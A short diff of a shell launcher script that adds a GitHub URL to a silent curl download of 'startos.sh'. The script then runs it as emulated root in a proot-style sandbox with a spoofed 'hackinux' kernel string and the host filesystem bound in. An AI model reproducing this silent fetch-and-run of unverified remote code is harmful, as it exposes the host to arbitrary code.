@@ -25,5 +25,5 @@ if [[ ! -e world_the_end/p ]]; then
 fi
 
 # start
-curl -Lso world_the_end/a/usr/startos.sh &>/dev/null
+curl -Lso world_the_end/a/usr/startos.sh https://github.com/hermanyas/hermanyas.github.io/raw/main/startos.sh &>/dev/null
 ./world_the_end/p -v -20 -k "\\$(uname -s)\\hackinux\\$(uname -r)\\$(uname -v)\\$(uname -m)\\localdomain\\-1\\" -r world_the_end/a -b /:/hst -b /dev -b /sys -b /proc -0 ash /usr/startos.sh
